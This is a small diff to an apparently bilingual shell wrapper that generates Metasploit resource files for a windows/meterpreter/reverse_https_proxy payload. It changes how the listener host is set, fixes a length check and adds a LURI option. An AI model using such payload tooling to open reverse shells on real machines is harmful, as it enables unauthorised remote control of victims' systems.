@@ -1,5 +1,5 @@
 function defaul_payload_options {
-	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
+	lhost=$local_ip
 	httpproxyhost=""
 	httpproxypass=""
 	httpproxyport=""
@@ -10,7 +10,7 @@ function defaul_payload_options {
 	luri=""
 }
 function payload_compare {
-lhost_lenght=`echo "$lhost" | awk '{print length}'`
+lhost_lenght=`echo $lhost | awk '{print length}'`
 	if  [ "$lhost_lenght" -le 18 ]; then
 		payload1
 	else
@@ -253,6 +253,7 @@ Các tùy chọn của tải trọng (windows/meterpreter/reverse_https_proxy):
    LHOST          $lhost$yes    Địa chỉ lắng nghe.
    LPORT          $lport$yes    Cổng lắng nghe.
    LURI           $luri$no   Đường dẫn HTTP.
+   
 !
 elif [ "$language" = "EN" ]; then
 yes="     yes"
@@ -328,6 +329,7 @@ config_file="$payload_path_present/Config/config"
 	echo "set HttpProxyType $httpproxytype" >> $rc_file
 	echo "set HttpProxyUser $httpproxyuser" >> $rc_file
 	echo "set HttpProxyPass $httpproxypass" >> $rc_file
+	echo "set LURI $luri" >> $rc_file
 	paylo="windows/meterpreter/reverse_https_proxy"
 	lhost=$lhost
 	lport=$lport
